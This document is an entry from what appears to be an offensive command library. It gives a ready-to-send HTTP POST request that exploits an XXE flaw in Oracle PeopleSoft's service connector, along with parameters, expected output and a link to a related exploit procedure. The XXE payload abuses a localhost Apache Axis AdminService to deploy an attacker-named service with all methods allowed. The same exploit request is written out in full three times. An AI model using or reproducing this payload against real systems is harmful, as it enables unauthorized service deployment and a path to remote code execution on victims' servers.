---
data: >-
  POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1

  Host: ████████

  Content-Type: application/xml

  Content-Length: 608


  <!DOCTYPE a PUBLIC "-//B/A/EN"
  "http://localhost:80/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22h1testservice%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.pluto.portalImpl.Deploy%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment">
tags:
  - xxe
  - http-post
type: command
executor: bash
platforms:
  - Web
id: 54d191ca-9c2a-44a2-a094-e68b8c50a640
created_at: '2025-12-13T09:00:27.393Z'
updated_at: '2025-12-13T09:00:27.393Z'
verified: false
validated: true
submitted: true
---
# peoplesoft-xxe-payload-post

## Command

```bash
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: ████████
Content-Type: application/xml
Content-Length: 608

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://localhost:80/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22h1testservice%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.pluto.portalImpl.Deploy%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment">
```

## Description

Sends a POST request with an XXE payload to exploit the vulnerability in Oracle PeopleSoft and deploy a new Apache Axis service named 'h1testservice'.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Target host (e.g., ████████) | Yes |
| `Content-Type` | Set to application/xml | Yes |
| `Content-Length` | Length of the payload (e.g., 608) | Yes |
| `method` | Encoded XML deployment configuration for service creation | Yes |

## Examples

### Basic Usage

```bash
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: ████████
Content-Type: application/xml
Content-Length: 608

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://localhost:80/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22h1testservice%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.pluto.portalImpl.Deploy%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment">
```

## Expected Output

URL of the newly created service, e.g., https://██████████/pspc/services/h1testservice

## Related

- [[procedures/Exploit-XXE-in-PeopleSoft-to-Deploy-Service]]
